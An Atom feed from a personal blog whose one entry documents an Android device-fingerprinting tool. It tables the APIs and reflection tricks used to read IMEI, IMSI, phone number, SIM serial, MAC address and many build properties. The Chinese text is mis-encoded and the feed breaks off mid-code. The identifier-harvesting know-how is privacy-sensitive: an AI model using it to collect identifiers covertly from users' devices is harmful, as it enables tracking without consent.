<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1nec-1o&#39;s B1og</title>
  
  
  <link href="http://s1nec-1o.github.io/atom.xml" rel="self"/>
  
  <link href="http://s1nec-1o.github.io/"/>
  <updated>2025-11-18T08:34:14.082Z</updated>
  <id>http://s1nec-1o.github.io/</id>
  
  <author>
    <name>s1nec-1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Androidè®¾å¤‡æŒ‡çº¹é‡‡é›†å®è·µ</title>
    <link href="http://s1nec-1o.github.io/2025/11/18/Android%E8%AE%BE%E5%A4%87%E6%8C%87%E7%BA%B9%E9%87%87%E9%9B%86%E5%AE%9E%E8%B7%B5/"/>
    <id>http://s1nec-1o.github.io/2025/11/18/Android%E8%AE%BE%E5%A4%87%E6%8C%87%E7%BA%B9%E9%87%87%E9%9B%86%E5%AE%9E%E8%B7%B5/</id>
    <published>2025-11-18T08:32:20.000Z</published>
    <updated>2025-11-18T08:34:14.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="spHunter-Android-è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·"><a href="#spHunter-Android-è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·" class="headerlink" title="spHunter - Android è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·"></a>spHunter - Android è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·</h1><h2 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h2><p>æ–°æ‰‹ç»ƒæ‰‹é¡¹ç›®ï¼š<a href="https://github.com/s1nec-1o/sphunter-x">https://github.com/s1nec-1o/sphunter-x</a></p><h2 id="ğŸ“–-é¡¹ç›®ç®€ä»‹"><a href="#ğŸ“–-é¡¹ç›®ç®€ä»‹" class="headerlink" title="ğŸ“– é¡¹ç›®ç®€ä»‹"></a>ğŸ“– é¡¹ç›®ç®€ä»‹</h2><p>spHunter æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ Android è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·ï¼Œèƒ½å¤Ÿä» Java å±‚å’Œ Native å±‚å…¨é¢æ”¶é›†è®¾å¤‡æŒ‡çº¹ä¿¡æ¯ã€‚è¯¥é¡¹ç›®é‡‡ç”¨æ¨¡å—åŒ–æ¶æ„è®¾è®¡ï¼Œé€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ Hidden APIï¼Œå¹¶ä½¿ç”¨ JNI æŠ€æœ¯è®¿é—®åº•å±‚ç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºè®¾å¤‡è¯†åˆ«å’Œå®‰å…¨åˆ†ææä¾›å…¨é¢çš„æ•°æ®æ”¯æŒã€‚</p><h2 id="âœ¨-ä¸»è¦åŠŸèƒ½"><a href="#âœ¨-ä¸»è¦åŠŸèƒ½" class="headerlink" title="âœ¨ ä¸»è¦åŠŸèƒ½"></a>âœ¨ ä¸»è¦åŠŸèƒ½</h2><ul><li><strong>Java å±‚æŒ‡çº¹é‡‡é›†</strong>ï¼šé€šè¿‡ Android SDK API å’Œåå°„æœºåˆ¶è·å–è®¾å¤‡ä¿¡æ¯</li><li><strong>Native å±‚æŒ‡çº¹é‡‡é›†</strong>ï¼šé€šè¿‡ JNI è°ƒç”¨ C++ ä»£ç ç›´æ¥è®¿é—®ç³»ç»Ÿåº•å±‚ä¿¡æ¯</li><li><strong>Hidden API è°ƒç”¨</strong>ï¼šä½¿ç”¨åå°„æœºåˆ¶ç»•è¿‡ Android é™åˆ¶ï¼Œè®¿é—®éšè—çš„ç³»ç»Ÿ API</li><li><strong>æ•°æ®æ¸…æ´—ä¸ç»“æ„åŒ–</strong>ï¼šå°†é‡‡é›†çš„åŸå§‹æ•°æ®æ¸…æ´—å¹¶æ ¼å¼åŒ–ä¸º JSON æ ¼å¼</li><li><strong>å®‰å…¨åˆ†æ</strong>ï¼šæ£€æµ‹æ¨¡æ‹Ÿå™¨ã€Rootã€è°ƒè¯•æ¨¡å¼ã€Zygisk æ³¨å…¥ç­‰å®‰å…¨é£é™©</li></ul><h2 id="ğŸ—ï¸-é¡¹ç›®æ¶æ„"><a href="#ğŸ—ï¸-é¡¹ç›®æ¶æ„" class="headerlink" title="ğŸ—ï¸ é¡¹ç›®æ¶æ„"></a>ğŸ—ï¸ é¡¹ç›®æ¶æ„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">com.sheep.sphunter/</span><br><span class="line">â”œâ”€â”€ ui/                          # UI å±‚</span><br><span class="line">â”‚   â””â”€â”€ MainActivity.java        # ä¸»ç•Œé¢</span><br><span class="line">â”œâ”€â”€ fingerprint/                 # æŒ‡çº¹é‡‡é›†æ ¸å¿ƒæ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ FingerprintService.java  # æŒ‡çº¹é‡‡é›†æœåŠ¡ï¼ˆç»Ÿä¸€å…¥å£ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ device/                  # è®¾å¤‡ä¿¡æ¯é‡‡é›†å™¨</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ SettingsCollector.java      # Settings ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ BluetoothCollector.java     # è“ç‰™ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ SerialNumberCollector.java  # åºåˆ—å·é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ PhoneInfoCollector.java     # ç”µè¯ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ BuildInfoCollector.java     # Build ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ AccountCollector.java       # è´¦æˆ·ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ MediaCollector.java         # åª’ä½“ä¿¡æ¯é‡‡é›†ï¼ˆéŸ³é‡ã€DRMï¼‰</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ SensorCollector.java        # ä¼ æ„Ÿå™¨ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ FileInfoCollector.java      # æ–‡ä»¶ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ glendererCollector.java      # OpenGL æ¸²æŸ“å™¨ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ batteryCollector.java        # ç”µæ± ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â”‚   â””â”€â”€ MemoryCollector.java         # å†…å­˜ä¿¡æ¯é‡‡é›†</span><br><span class="line">â”‚   â””â”€â”€ jni/                     # Native å±‚æ¥å£</span><br><span class="line">â”‚       â””â”€â”€ NativeFingerprint.java       # JNI æ¥å£å°è£…</span><br><span class="line">â”œâ”€â”€ model/                       # æ•°æ®æ¨¡å‹</span><br><span class="line">â”‚   â””â”€â”€ FingerprintResult.java   # æŒ‡çº¹ç»“æœæ•°æ®æ¨¡å‹</span><br><span class="line">â””â”€â”€ util/                        # å·¥å…·ç±»</span><br><span class="line">    â””â”€â”€ Constants.java            # å¸¸é‡å®šä¹‰</span><br></pre></td></tr></table></figure><h2 id="ğŸ“‹-Java-å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…"><a href="#ğŸ“‹-Java-å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…" class="headerlink" title="ğŸ“‹ Java å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…"></a>ğŸ“‹ Java å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…</h2><h3 id="1-Settings-ä¿¡æ¯-SettingsCollector"><a href="#1-Settings-ä¿¡æ¯-SettingsCollector" class="headerlink" title="1. Settings ä¿¡æ¯ (SettingsCollector)"></a>1. Settings ä¿¡æ¯ (SettingsCollector)</h3><p>é€šè¿‡ <code>Settings.Secure</code> å’Œ <code>Settings.Global</code> è·å–ï¼š</p><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>android_id</code></td><td>Android ID</td><td><code>Settings.Secure.getString(resolver, Settings.Secure.ANDROID_ID)</code></td></tr><tr><td><code>mi_health_id</code></td><td>å°ç±³å¥åº· ID</td><td><code>Settings.Global.getString(resolver, &quot;mi_health_id&quot;)</code></td></tr><tr><td><code>gcbooster_uuid</code></td><td>GC Booster UUID</td><td><code>Settings.Global.getString(resolver, &quot;gcbooster_uuid&quot;)</code></td></tr><tr><td><code>key_mqs_uuid</code></td><td>MQS UUID</td><td><code>Settings.Global.getString(resolver, &quot;key_mqs_uuid&quot;)</code></td></tr><tr><td><code>ad_aaid</code></td><td>å¹¿å‘Š AAID</td><td><code>Settings.Global.getString(resolver, &quot;ad_aaid&quot;)</code></td></tr><tr><td><code>bluetooth_name</code></td><td>è“ç‰™åç§°</td><td><code>Settings.Global.getString(resolver, &quot;bluetooth_name&quot;)</code></td></tr><tr><td><code>bluetooth_address</code></td><td>è“ç‰™åœ°å€</td><td><code>Settings.Global.getString(resolver, &quot;bluetooth_address&quot;)</code></td></tr></tbody></table><p><strong>Hidden API è°ƒç”¨</strong>ï¼š</p><ul><li><code>ContentResolver.call(Uri.parse(&quot;content://settings/secure&quot;), &quot;GET_secure&quot;, &quot;android_id&quot;, Bundle)</code> - é€šè¿‡ ContentProvider è°ƒç”¨è·å– Android ID</li></ul><h3 id="2-è“ç‰™ä¿¡æ¯-BluetoothCollector"><a href="#2-è“ç‰™ä¿¡æ¯-BluetoothCollector" class="headerlink" title="2. è“ç‰™ä¿¡æ¯ (BluetoothCollector)"></a>2. è“ç‰™ä¿¡æ¯ (BluetoothCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>bluetoothAddress</code></td><td>è“ç‰™ MAC åœ°å€</td><td><code>BluetoothAdapter.getDefaultAdapter().getAddress()</code></td></tr></tbody></table><h3 id="3-åºåˆ—å·ä¿¡æ¯-SerialNumberCollector"><a href="#3-åºåˆ—å·ä¿¡æ¯-SerialNumberCollector" class="headerlink" title="3. åºåˆ—å·ä¿¡æ¯ (SerialNumberCollector)"></a>3. åºåˆ—å·ä¿¡æ¯ (SerialNumberCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>serialNumber</code></td><td>è®¾å¤‡åºåˆ—å·</td><td><code>Build.getSerial()</code> (Android 8.0+) æˆ– <code>Build.SERIAL</code> (Android 8.0 ä»¥ä¸‹)</td></tr></tbody></table><p><strong>æƒé™è¦æ±‚</strong>ï¼šAndroid 8.0+ éœ€è¦ <code>READ_PHONE_STATE</code> æƒé™</p><h3 id="4-ç”µè¯ä¿¡æ¯-PhoneInfoCollector"><a href="#4-ç”µè¯ä¿¡æ¯-PhoneInfoCollector" class="headerlink" title="4. ç”µè¯ä¿¡æ¯ (PhoneInfoCollector)"></a>4. ç”µè¯ä¿¡æ¯ (PhoneInfoCollector)</h3><h4 id="å…¬å¼€-API-å­—æ®µ"><a href="#å…¬å¼€-API-å­—æ®µ" class="headerlink" title="å…¬å¼€ API å­—æ®µ"></a>å…¬å¼€ API å­—æ®µ</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>DeviceId(IMEI)</code></td><td>è®¾å¤‡ ID&#x2F;IMEI</td><td><code>TelephonyManager.getImei()</code> (Android 8.0+) æˆ– <code>TelephonyManager.getDeviceId()</code></td></tr><tr><td><code>DeviceSoftwareVersion</code></td><td>è®¾å¤‡è½¯ä»¶ç‰ˆæœ¬</td><td><code>TelephonyManager.getDeviceSoftwareVersion()</code></td></tr><tr><td><code>Line1Number</code></td><td>ç”µè¯å·ç </td><td><code>TelephonyManager.getLine1Number()</code></td></tr><tr><td><code>NetworkCountryIso</code></td><td>ç½‘ç»œå›½å®¶ä»£ç </td><td><code>TelephonyManager.getNetworkCountryIso()</code></td></tr><tr><td><code>NetworkOperator</code></td><td>ç½‘ç»œè¿è¥å•†ä»£ç </td><td><code>TelephonyManager.getNetworkOperator()</code></td></tr><tr><td><code>NetworkOperatorName</code></td><td>ç½‘ç»œè¿è¥å•†åç§°</td><td><code>TelephonyManager.getNetworkOperatorName()</code></td></tr><tr><td><code>NetworkType</code></td><td>ç½‘ç»œç±»å‹</td><td><code>TelephonyManager.getNetworkType()</code></td></tr><tr><td><code>PhoneType</code></td><td>ç”µè¯ç±»å‹</td><td><code>TelephonyManager.getPhoneType()</code></td></tr><tr><td><code>SimCountryIso</code></td><td>SIM å¡å›½å®¶ä»£ç </td><td><code>TelephonyManager.getSimCountryIso()</code></td></tr><tr><td><code>SimOperator</code></td><td>SIM å¡è¿è¥å•†ä»£ç </td><td><code>TelephonyManager.getSimOperator()</code></td></tr><tr><td><code>SimOperatorName</code></td><td>SIM å¡è¿è¥å•†åç§°</td><td><code>TelephonyManager.getSimOperatorName()</code></td></tr><tr><td><code>SimSerialNumber</code></td><td>SIM å¡åºåˆ—å·</td><td><code>TelephonyManager.getSimSerialNumber()</code></td></tr><tr><td><code>SimState</code></td><td>SIM å¡çŠ¶æ€</td><td><code>TelephonyManager.getSimState()</code></td></tr><tr><td><code>SubscriberId(IMSI)</code></td><td>ç”¨æˆ· ID&#x2F;IMSI</td><td><code>TelephonyManager.getSubscriberId()</code></td></tr><tr><td><code>VoiceMailNumber</code></td><td>è¯­éŸ³ä¿¡ç®±å·ç </td><td><code>TelephonyManager.getVoiceMailNumber()</code></td></tr></tbody></table><h4 id="Hidden-API-å­—æ®µï¼ˆé€šè¿‡åå°„è°ƒç”¨ï¼‰"><a href="#Hidden-API-å­—æ®µï¼ˆé€šè¿‡åå°„è°ƒç”¨ï¼‰" class="headerlink" title="Hidden API å­—æ®µï¼ˆé€šè¿‡åå°„è°ƒç”¨ï¼‰"></a>Hidden API å­—æ®µï¼ˆé€šè¿‡åå°„è°ƒç”¨ï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>Hidden API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>MEID</code></td><td>ç§»åŠ¨è®¾å¤‡æ ‡è¯†ç¬¦ï¼ˆCDMAï¼‰</td><td><code>TelephonyManager.getMeid()</code></td></tr><tr><td><code>NAI</code></td><td>ç½‘ç»œè®¿é—®æ ‡è¯†ç¬¦</td><td><code>TelephonyManager.getNai()</code></td></tr><tr><td><code>DataNetworkType</code></td><td>æ•°æ®ç½‘ç»œç±»å‹</td><td><code>TelephonyManager.getDataNetworkType()</code></td></tr><tr><td><code>PhoneCount</code></td><td>ç”µè¯æ•°é‡ï¼ˆåŒå¡ï¼‰</td><td><code>TelephonyManager.getPhoneCount()</code></td></tr><tr><td><code>ActiveModemCount</code></td><td>æ´»åŠ¨è°ƒåˆ¶è§£è°ƒå™¨æ•°é‡</td><td><code>TelephonyManager.getActiveModemCount()</code> (Android 11+)</td></tr><tr><td><code>IMEI[Slot0/1]</code></td><td>åŒå¡ IMEI</td><td><code>TelephonyManager.getImei(int slotIndex)</code></td></tr><tr><td><code>DeviceId[Slot0/1]</code></td><td>åŒå¡è®¾å¤‡ ID</td><td><code>TelephonyManager.getDeviceId(int slotIndex)</code></td></tr><tr><td><code>MEID[Slot0/1]</code></td><td>åŒå¡ MEID</td><td><code>TelephonyManager.getMeid(int slotIndex)</code></td></tr><tr><td><code>SubscriberId[SubId0/1]</code></td><td>åŒå¡ IMSI</td><td><code>TelephonyManager.getSubscriberId(int subId)</code></td></tr><tr><td><code>CarrierConfig</code></td><td>è¿è¥å•†é…ç½®ä¿¡æ¯</td><td><code>TelephonyManager.getCarrierConfig()</code></td></tr></tbody></table><p><strong>åå°„è°ƒç”¨ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TelephonyManager.class.getDeclaredMethod(<span class="string">&quot;getMeid&quot;</span>);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">meid</span> <span class="operator">=</span> (String) method.invoke(telephonyManager);</span><br></pre></td></tr></table></figure><h3 id="5-Build-ä¿¡æ¯-BuildInfoCollector"><a href="#5-Build-ä¿¡æ¯-BuildInfoCollector" class="headerlink" title="5. Build ä¿¡æ¯ (BuildInfoCollector)"></a>5. Build ä¿¡æ¯ (BuildInfoCollector)</h3><p>é€šè¿‡åå°„è°ƒç”¨ <code>android.os.SystemProperties</code> è·å–ç³»ç»Ÿå±æ€§ï¼š</p><h4 id="USB-é…ç½®ç›¸å…³"><a href="#USB-é…ç½®ç›¸å…³" class="headerlink" title="USB é…ç½®ç›¸å…³"></a>USB é…ç½®ç›¸å…³</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>sys.usb.config</code></td><td>USB é…ç½®</td></tr><tr><td><code>sys.usb.state</code></td><td>USB çŠ¶æ€</td></tr><tr><td><code>persist.sys.usb.config</code></td><td>æŒä¹…åŒ– USB é…ç½®</td></tr><tr><td><code>persist.sys.usb.qmmi.func</code></td><td>USB QMMI åŠŸèƒ½</td></tr><tr><td><code>vendor.usb.mimode</code></td><td>å‚å•† USB æ¨¡å¼</td></tr><tr><td><code>persist.vendor.usb.config</code></td><td>æŒä¹…åŒ–å‚å•† USB é…ç½®</td></tr></tbody></table><h4 id="å®‰å…¨ç›¸å…³"><a href="#å®‰å…¨ç›¸å…³" class="headerlink" title="å®‰å…¨ç›¸å…³"></a>å®‰å…¨ç›¸å…³</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.debuggable</code></td><td>æ˜¯å¦å¯è°ƒè¯•</td></tr><tr><td><code>init.svc.adbd</code></td><td>ADB å®ˆæŠ¤è¿›ç¨‹çŠ¶æ€</td></tr><tr><td><code>ro.secure</code></td><td>å®‰å…¨æ¨¡å¼</td></tr><tr><td><code>ro.boot.flash.locked</code></td><td>å¼•å¯¼åŠ è½½ç¨‹åºé”å®šçŠ¶æ€</td></tr><tr><td><code>sys.oem_unlock_allowed</code></td><td>æ˜¯å¦å…è®¸ OEM è§£é”</td></tr></tbody></table><h4 id="Build-ID-ç›¸å…³"><a href="#Build-ID-ç›¸å…³" class="headerlink" title="Build ID ç›¸å…³"></a>Build ID ç›¸å…³</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.id</code></td><td>Build ID</td></tr><tr><td><code>ro.build.build.id</code></td><td>Build Build ID</td></tr><tr><td><code>ro.bootimage.build.id</code></td><td>Boot Image Build ID</td></tr><tr><td><code>ro.odm.build.id</code></td><td>ODM Build ID</td></tr><tr><td><code>ro.product.build.id</code></td><td>Product Build ID</td></tr><tr><td><code>ro.system_ext.build.id</code></td><td>System Ext Build ID</td></tr><tr><td><code>ro.system.build.id</code></td><td>System Build ID</td></tr><tr><td><code>ro.vendor.build.id</code></td><td>Vendor Build ID</td></tr></tbody></table><h4 id="å®‰å…¨è¡¥ä¸"><a href="#å®‰å…¨è¡¥ä¸" class="headerlink" title="å®‰å…¨è¡¥ä¸"></a>å®‰å…¨è¡¥ä¸</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.version.security_patch</code></td><td>å®‰å…¨è¡¥ä¸ç‰ˆæœ¬</td></tr></tbody></table><h4 id="å…¶ä»–ç³»ç»Ÿä¿¡æ¯"><a href="#å…¶ä»–ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="å…¶ä»–ç³»ç»Ÿä¿¡æ¯"></a>å…¶ä»–ç³»ç»Ÿä¿¡æ¯</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.boot.vbmeta.digest</code></td><td>VBMeta æ‘˜è¦</td></tr><tr><td><code>ro.netflix.bsp_rev</code></td><td>Netflix BSP ç‰ˆæœ¬</td></tr><tr><td><code>gsm.version.baseband</code></td><td>åŸºå¸¦ç‰ˆæœ¬</td></tr></tbody></table><h4 id="Build-æ—¥æœŸ-UTC"><a href="#Build-æ—¥æœŸ-UTC" class="headerlink" title="Build æ—¥æœŸ UTC"></a>Build æ—¥æœŸ UTC</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.date.utc</code></td><td>Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.build.build.date.utc</code></td><td>Build Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.bootimage.build.date.utc</code></td><td>Boot Image Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.odm.build.date.utc</code></td><td>ODM Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.product.build.date.utc</code></td><td>Product Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.system_ext.build.date.utc</code></td><td>System Ext Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.system.build.date.utc</code></td><td>System Build æ—¥æœŸ UTC</td></tr><tr><td><code>ro.vendor.build.date.utc</code></td><td>Vendor Build æ—¥æœŸ UTC</td></tr></tbody></table><h4 id="Display-ID-å’Œ-Tags"><a href="#Display-ID-å’Œ-Tags" class="headerlink" title="Display ID å’Œ Tags"></a>Display ID å’Œ Tags</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.display.id</code></td><td>Build Display ID</td></tr><tr><td><code>ro.build.tags</code></td><td>Build Tags</td></tr><tr><td><code>ro.build.build.tags</code></td><td>Build Build Tags</td></tr><tr><td><code>ro.bootimage.build.tags</code></td><td>Boot Image Build Tags</td></tr><tr><td><code>ro.odm.build.tags</code></td><td>ODM Build Tags</td></tr><tr><td><code>ro.product.build.tags</code></td><td>Product Build Tags</td></tr><tr><td><code>ro.system_ext.build.tags</code></td><td>System Ext Build Tags</td></tr><tr><td><code>ro.system.build.tags</code></td><td>System Build Tags</td></tr><tr><td><code>ro.vendor.build.tags</code></td><td>Vendor Build Tags</td></tr></tbody></table><h4 id="Build-Host-å’Œ-User"><a href="#Build-Host-å’Œ-User" class="headerlink" title="Build Host å’Œ User"></a>Build Host å’Œ User</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.host</code></td><td>Build ä¸»æœºå</td></tr><tr><td><code>ro.build.user</code></td><td>Build ç”¨æˆ·å</td></tr><tr><td><code>ro.config.ringtone</code></td><td>é»˜è®¤é“ƒå£°</td></tr><tr><td><code>ro.miui.ui.version.name</code></td><td>MIUI UI ç‰ˆæœ¬åç§°</td></tr></tbody></table><h4 id="Build-Version-Incremental"><a href="#Build-Version-Incremental" class="headerlink" title="Build Version Incremental"></a>Build Version Incremental</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.version.incremental</code></td><td>Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.build.build.version.incremental</code></td><td>Build Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.bootimage.build.version.incremental</code></td><td>Boot Image Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.odm.build.version.incremental</code></td><td>ODM Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.product.build.version.incremental</code></td><td>Product Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.system_ext.build.version.incremental</code></td><td>System Ext Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.system.build.version.incremental</code></td><td>System Build ç‰ˆæœ¬å¢é‡</td></tr><tr><td><code>ro.vendor.build.version.incremental</code></td><td>Vendor Build ç‰ˆæœ¬å¢é‡</td></tr></tbody></table><h4 id="Build-Description"><a href="#Build-Description" class="headerlink" title="Build Description"></a>Build Description</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.description</code></td><td>Build æè¿°</td></tr></tbody></table><h4 id="Build-Fingerprint"><a href="#Build-Fingerprint" class="headerlink" title="Build Fingerprint"></a>Build Fingerprint</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.build.fingerprint</code></td><td>Build æŒ‡çº¹</td></tr><tr><td><code>ro.build.build.fingerprint</code></td><td>Build Build æŒ‡çº¹</td></tr><tr><td><code>ro.bootimage.build.fingerprint</code></td><td>Boot Image Build æŒ‡çº¹</td></tr><tr><td><code>ro.odm.build.fingerprint</code></td><td>ODM Build æŒ‡çº¹</td></tr><tr><td><code>ro.product.build.fingerprint</code></td><td>Product Build æŒ‡çº¹</td></tr><tr><td><code>ro.system_ext.build.fingerprint</code></td><td>System Ext Build æŒ‡çº¹</td></tr><tr><td><code>ro.system.build.fingerprint</code></td><td>System Build æŒ‡çº¹</td></tr><tr><td><code>ro.vendor.build.fingerprint</code></td><td>Vendor Build æŒ‡çº¹</td></tr></tbody></table><h4 id="åºåˆ—å·å’Œç¡¬ä»¶ä¿¡æ¯"><a href="#åºåˆ—å·å’Œç¡¬ä»¶ä¿¡æ¯" class="headerlink" title="åºåˆ—å·å’Œç¡¬ä»¶ä¿¡æ¯"></a>åºåˆ—å·å’Œç¡¬ä»¶ä¿¡æ¯</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.boot.serialno</code></td><td>å¼•å¯¼åºåˆ—å·</td></tr><tr><td><code>ro.serialno</code></td><td>åºåˆ—å·</td></tr><tr><td><code>ro.boot.hardware</code></td><td>å¼•å¯¼ç¡¬ä»¶</td></tr><tr><td><code>ro.hardware</code></td><td>ç¡¬ä»¶</td></tr></tbody></table><h4 id="CPU-ABI-ä¿¡æ¯"><a href="#CPU-ABI-ä¿¡æ¯" class="headerlink" title="CPU ABI ä¿¡æ¯"></a>CPU ABI ä¿¡æ¯</h4><table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ro.product.cpu.abilist</code></td><td>CPU ABI åˆ—è¡¨</td></tr><tr><td><code>ro.product.cpu.abilist32</code></td><td>CPU ABI 32 ä½åˆ—è¡¨</td></tr><tr><td><code>ro.product.cpu.abilist64</code></td><td>CPU ABI 64 ä½åˆ—è¡¨</td></tr></tbody></table><p><strong>Hidden API è°ƒç”¨</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–ç³»ç»Ÿå±æ€§ï¼ˆå­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">Class&lt;?&gt; systemProperties = Class.forName(<span class="string">&quot;android.os.SystemProperties&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">get</span> <span class="operator">=</span> systemProperties.getMethod(<span class="string">&quot;get&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) get.invoke(<span class="literal">null</span>, <span class="string">&quot;ro.build.id&quot;</span>, <span class="string">&quot;null&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ç³»ç»Ÿå±æ€§ï¼ˆé•¿æ•´å‹ï¼‰</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getLong</span> <span class="operator">=</span> systemProperties.getMethod(<span class="string">&quot;getLong&quot;</span>, String.class, <span class="type">long</span>.class);</span><br><span class="line"><span class="type">long</span> <span class="variable">value</span> <span class="operator">=</span> (Long) getLong.invoke(<span class="literal">null</span>, <span class="string">&quot;property.key&quot;</span>, <span class="number">0L</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ç³»ç»Ÿå±æ€§ï¼ˆæ•´å‹ï¼‰</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getInt</span> <span class="operator">=</span> systemProperties.getMethod(<span class="string">&quot;getInt&quot;</span>, String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> (Integer) getInt.invoke(<span class="literal">null</span>, <span class="string">&quot;property.key&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 